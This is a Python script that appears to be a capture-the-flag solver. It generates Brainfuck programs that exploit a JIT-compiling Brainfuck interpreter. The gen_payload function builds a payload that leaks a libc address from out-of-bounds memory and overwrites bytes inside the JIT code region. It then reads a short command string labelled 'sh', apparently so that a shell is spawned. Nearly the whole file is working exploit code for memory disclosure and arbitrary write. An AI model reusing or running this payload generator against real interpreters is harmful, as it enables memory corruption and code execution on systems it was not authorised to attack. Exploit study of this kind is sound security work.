from __future__ import annotations
from typing import Any, Callable, List, Optional


class CodeGenerator:

    def __init__(self, verbose: bool = False):
        self.data_index = 0
        self.pointer = 0
        self.code: List[str] = []
        self.verbose = verbose

    def alloc_index(self) -> int:
        ans = self.data_index
        self.data_index += 1
        return ans

    def free_index(self, x: int):
        assert x == self.data_index - 1
        self.data_index -= 1

    def dump_code(self) -> str:
        return ''.join(self.code)

    def move_to(self, x: int):
        if x > self.pointer:
            self.code.append('>' * (x - self.pointer))
        elif x < self.pointer:
            self.code.append('<' * (self.pointer - x))
        self.pointer = x

    def comment(self, s: str, tmp: Optional[int] = None):
        if not self.verbose:
            return
        assert ('[' not in s) and (']' not in s)
        max_len = 50
        old_ptr = self.pointer
        d_tmp = self.alloc_index() if tmp is None else tmp
        self.code.append("\n    ; ")
        self.move_to(d_tmp)
        offset = 15 - abs(old_ptr - d_tmp)
        self.code.append("[-]" + ' ' * offset + "[  " + s.ljust(max_len) + "  ]")
        if tmp is None:
            self.free_index(d_tmp)
        self.move_to(old_ptr)
        self.code.append('\n')

    def assign_old(self, ptr: int, val: int, old: int):
        self.move_to(ptr)
        if val > old:
            self.code.append("+" * (val - old))
        if val < old:
            self.code.append("-" * (old - val))

    def assign(self, ptr: int, val: int):
        if val >= 0x80:
            val = val - 0x100
        self.move_to(ptr)
        self.code.append("[-]")
        self.assign_old(ptr, val, 0)
    
    def copy_mov(self, dest: int, src: int):
        if dest == src:
            return
        self.assign(dest, 0)
        self.move_to(src)
        self.code.append('[')
        self.move_to(dest)
        self.code.append('+')
        self.move_to(src)
        self.code.append('-')
        self.code.append(']')

    def copy(self, dest: int, src: int, tmp: Optional[int] = None):
        if dest == src:
            return
        d_tmp = self.alloc_index() if tmp is None else tmp
        self.assign(d_tmp, 0)
        self.assign(dest, 0)
        self.move_to(src)
        self.code.append('[')
        self.move_to(dest)
        self.code.append('+')
        self.move_to(d_tmp)
        self.code.append('+')
        self.move_to(src)
        self.code.append('-')
        self.code.append(']')
        self.move_to(d_tmp)
        self.code.append('[')
        self.move_to(src)
        self.code.append('+')
        self.move_to(d_tmp)
        self.code.append('-')
        self.code.append(']')
        if tmp is None:
            self.free_index(d_tmp)

    def while_begin(self, ptr: int):
        self.move_to(ptr)
        self.code.append('[')

    def while_end(self, ptr: int):
        self.move_to(ptr)
        self.code.append(']')

    def getchar(self, ptr: int):
        self.move_to(ptr)
        self.code.append(',')

    def putchar_at(self, ptr: int):
        self.move_to(ptr)
        self.code.append('.')

    def add_const(self, dest: int, src: int, x: int, tmp: Optional[int] = None):
        if src != dest:
            self.copy(dest, src, tmp)
        self.move_to(dest)
        if x > 0:
            self.code.append("+" * x)
        if x < 0:
            self.code.append("-" * (-x))

    def if_begin(self, ptr: int):
        self.move_to(ptr)
        self.code.append('[')
        self.assign(ptr, 0)

    def if_end(self, ptr: int):
        self.move_to(ptr)
        self.code.append(']')

    def if_else_begin(self, ptr: int, tmp: int):
        self.assign(tmp, 1)
        self.if_begin(ptr)
        self.assign(tmp, 0)

    def if_else_mid(self, ptr: int, tmp: int):
        self.if_end(ptr)
        self.if_begin(tmp)

    def if_else_end(self, ptr: int, tmp: int):
        self.if_end(tmp)

    def print_str(self, s: str, tmp: Optional[int] = None):
        d_tmp = self.alloc_index() if tmp is None else tmp
        self.move_to(d_tmp)
        for i in range(len(s)):
            if i == 0:
                self.assign(d_tmp, ord(s[i]))
            else:
                self.assign_old(d_tmp, ord(s[i]), ord(s[i - 1]))
            self.code.append('.')
        if tmp is None:
            self.free_index(d_tmp)
    
    def is_zero(self, x: int, y: int, tmp: Optional[int] = None):
        # x = y == 0
        d_tmp = self.alloc_index() if tmp is None else tmp
        self.assign(x, 1)
        self.assign(d_tmp, 0)
        self.move_to(y)
        self.code.append('[')
        self.add_const(x, x, 1)
        self.move_to(d_tmp)
        self.add_const(d_tmp, d_tmp, 1)
        self.add_const(y, y, -1)
        self.code.append(']')
        self.move_to(d_tmp)
        self.code.append('[')
        self.assign(x, 0)
        self.add_const(y, y, 1)
        self.add_const(d_tmp, d_tmp, -1)
        self.code.append(']')
        if tmp is None:
            self.free_index(d_tmp)
    
    def array_move_forward(self, mover: int, func: Callable):
        # space, ok, b0, b1, b2, data...
        space = mover
        ok = mover + 1
        b0 = mover + 2
        b1 = mover + 3
        b2 = mover + 4
        data = mover + 5

        self.assign(space, 0)
        self.assign(ok, 1)
        self.while_begin(ok)

        self.move_to(data)
        func()

        self.copy_mov(space, data)
        self.copy_mov(data, b2)
        self.copy_mov(b2, b1)
        self.copy_mov(b1, b0)
        self.copy_mov(b0, ok)
        self.code.append('>')

        self.is_zero(space, b0, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b0, b0, -1)
        self.while_begin(space)
        self.is_zero(space, b1, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b1, b1, -1)
        self.while_begin(space)
        self.is_zero(space, b2, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b2, b2, -1)
        self.if_begin(space)
        self.assign(ok, 0)
        self.if_end(space)
        self.while_end(space)
        self.while_end(space)

        self.while_end(ok)

    def array_move_backward(self, mover: int, func: Callable):
        # ...data, b0, b1, b2, ok, space
        b0 = mover
        b1 = mover + 1
        b2 = mover + 2
        ok = mover + 3
        space = mover + 4
        data = mover - 1

        self.assign(space, 0)
        self.assign(ok, 1)
        self.while_begin(ok)

        self.move_to(data)
        func()

        self.copy_mov(space, data)
        self.copy_mov(data, b0)
        self.copy_mov(b0, b1)
        self.copy_mov(b1, b2)
        self.copy_mov(b2, ok)
        self.code.append('<')

        self.is_zero(space, b0, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b0, b0, -1)
        self.while_begin(space)
        self.is_zero(space, b1, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b1, b1, -1)
        self.while_begin(space)
        self.is_zero(space, b2, ok)
        self.assign_old(ok, 1, 0)
        self.add_const(b2, b2, -1)
        self.if_begin(space)
        self.assign(ok, 0)
        self.if_end(space)
        self.while_end(space)
        self.while_end(space)

        self.while_end(ok)


class Solver:
    def __init__(self):
        self.gen = CodeGenerator(True)
        self.jit_exec_limit = 16
        self.jit_count = self.gen.alloc_index()
        self.jit_tmp1 = self.gen.alloc_index()
        self.jit_tmp2 = self.gen.alloc_index()

    def dump_code(self) -> str:
        return self.gen.dump_code()

    def jit_begin(self):
        self.gen.assign(self.jit_count, self.jit_exec_limit)
        self.gen.while_begin(self.jit_count)
        self.gen.add_const(self.jit_count, self.jit_count, -1)
        self.gen.copy(self.jit_tmp1, self.jit_count)
        self.gen.if_else_begin(self.jit_tmp1, self.jit_tmp2)
        self.gen.if_else_mid(self.jit_tmp1, self.jit_tmp2)

    def jit_end(self):
        self.gen.if_else_end(self.jit_tmp1, self.jit_tmp2)
        self.gen.while_end(self.jit_count)
    
    def fill_mover_forward(self, mover: List[int], offset: int):
        self.gen.assign(mover[2], offset & 0xff)
        self.gen.assign(mover[3], (offset >> 8) & 0xff)
        self.gen.assign(mover[4], (offset >> 16) & 0xff)

    def fill_mover_backward(self, mover: List[int], offset: int):
        self.gen.assign(mover[0], offset & 0xff)
        self.gen.assign(mover[1], (offset >> 8) & 0xff)
        self.gen.assign(mover[2], (offset >> 16) & 0xff)

    def show_mem(self, ptr: int):
        mover = [self.gen.alloc_index() for _ in range(5)]
        if ptr >= mover[-1] + 2:
            offset = ptr - mover[-1] - 2
            self.fill_mover_forward(mover, offset)
            self.gen.array_move_forward(mover[0], lambda: self.gen.putchar_at(self.gen.pointer))
            self.fill_mover_backward(mover, offset)
            self.gen.array_move_backward(mover[0], lambda: None)
        elif mover[0] >= ptr + 1:
            offset = mover[0] - ptr - 1
            self.fill_mover_backward(mover, offset)
            self.gen.array_move_backward(mover[0], lambda: self.gen.putchar_at(self.gen.pointer))
            self.fill_mover_forward(mover, offset)
            self.gen.array_move_forward(mover[0], lambda: None)
        else:
            raise IndexError
        for x in reversed(mover):
            self.gen.free_index(x)

    def edit_mem(self, ptr: int, size: int):
        mover = [self.gen.alloc_index() for _ in range(5)]
        # print("ptr", hex(ptr))
        if ptr >= mover[-1] + 2:
            offset = ptr - mover[-1] - 2
            self.fill_mover_forward(mover, offset)
            self.gen.array_move_forward(mover[0], lambda: None)
            d_ptr = mover[-1] + 1
            for i in range(size):
                self.gen.getchar(d_ptr + i)
            self.fill_mover_backward(mover, offset)
            self.gen.array_move_backward(mover[0], lambda: None)
        elif mover[0] >= ptr + 1:
            offset = mover[0] - ptr - 1
            self.fill_mover_backward(mover, offset)
            self.gen.array_move_backward(mover[0], lambda: None)
            d_ptr = mover[-1] + 1
            for i in range(size):
                self.gen.getchar(d_ptr + i)
            self.fill_mover_forward(mover, offset)
            self.gen.array_move_forward(mover[0], lambda: None)
        else:
            raise IndexError
        for x in reversed(mover):
            self.gen.free_index(x)
    
    def loop_inf(self):
        ptr = self.gen.pointer
        self.gen.assign(ptr, 1)
        self.gen.while_begin(ptr)
        self.gen.while_end(ptr)
    
    def read_str(self, size: int):
        ptr = [self.gen.alloc_index() for _ in range(size)]
        for i in range(size):
            self.gen.getchar(ptr[i])
        return ptr[0]
    
    def getchar(self):
        ptr = self.gen.alloc_index()
        self.gen.getchar(ptr)
        self.gen.free_index(ptr)


def gen_payload(libc_addr_ptr: int, jit_code_ptr: int) -> str:
    code_second = 0x900
    code_limit = 0x1000
    cmd_len = 10

    solver = Solver()
    solver.jit_begin()
    #solver.gen.comment("jit")
    solver.getchar()
    solver.show_mem(libc_addr_ptr)
    solver.edit_mem(jit_code_ptr + code_second * 8, 8)
    sh = solver.read_str(cmd_len)
    #solver.loop_inf()
    solver.jit_end()
    solver.gen.move_to(sh)

    code = solver.dump_code()
    assert len(code) <= code_second
    code = code.ljust(code_second)
    code += "[]"
    code = code.ljust(code_limit)
    return code


def gen_show_mem(addr: int):
    code_limit = 0x1000
    solver = Solver()
    solver.jit_begin()
    solver.getchar()
    solver.show_mem(addr)
    solver.jit_end()

    code = solver.dump_code()
    assert len(code) <= code_limit
    code = code.ljust(code_limit)
    return code


if __name__ == "__main__":
    """
    jit_code_ptr = 0x10020
    libc_addr_ptr = 0x1110
    code = gen_payload(libc_addr_ptr, jit_code_ptr)
    """

    code = gen_show_mem(0x1230)
    #code=gen_payload(-0x1230,0x10020)

    with open("code.bf", "w") as f:
        f.write(code)